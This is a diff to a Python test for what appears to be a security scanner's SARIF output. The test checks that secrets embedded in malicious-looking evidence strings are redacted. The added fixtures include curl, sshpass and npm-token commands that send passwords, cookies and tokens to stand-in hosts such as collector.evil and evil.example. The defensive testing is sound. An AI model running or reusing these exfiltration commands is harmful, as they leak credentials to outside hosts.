@@ -2234,6 +2234,11 @@ def test_catboost_sarif_redacts_follow_up_reversible_secret_variants(tmp_path: P
     bytes_evidence = repr([bytes_payload[:10].encode(), bytes_payload[10:22].encode(), bytes_payload[22:].encode()])
     evidence = [
         "subprocess.run(['curl','--password','argvpass9','https://collector.evil/upload'])",
+        "subprocess.run(['curl','--password=attachedpass11','https://collector.evil/upload'])",
+        "sshpass -f <(cat <<EOF\nsshfilepass12\nEOF\n) ssh user@evil.example",
+        "os.system('curl -b <(echo session=cookiepass13) https://collector.evil/upload')",
+        "os.system('sshpass -d 3 3<<<fdpass14 ssh user@evil.example id')",
+        "npm config set //registry.npmjs.org/:_authToken npmpass15 && curl https://collector.evil/upload",
         f'import os; {short_payload}; os.system("id")',
         'AWSSECRETACCESSKEY=awspass10 os.system("id")',
         f'{bytes_evidence}; os.system("id")',
@@ -2247,8 +2252,21 @@ def test_catboost_sarif_redacts_follow_up_reversible_secret_variants(tmp_path: P
     sarif = format_sarif_output(result, [str(model_path)])
 
     assert determine_exit_code(result) == 1
-    for secret in ("short7", "bytespass8", "argvpass9", "awspass10", "HEXSHORTSECRET1234"):
+    for secret in (
+        "short7",
+        "bytespass8",
+        "argvpass9",
+        "awspass10",
+        "HEXSHORTSECRET1234",
+        "attachedpass11",
+        "sshfilepass12",
+        "cookiepass13",
+        "fdpass14",
+        "npmpass15",
+    ):
         assert secret not in failed_details
         assert secret not in sarif
     assert "<redacted>" in failed_details
     assert "<redacted>" in sarif
+    assert "collector.evil" in failed_details
+    assert "collector.evil" in sarif
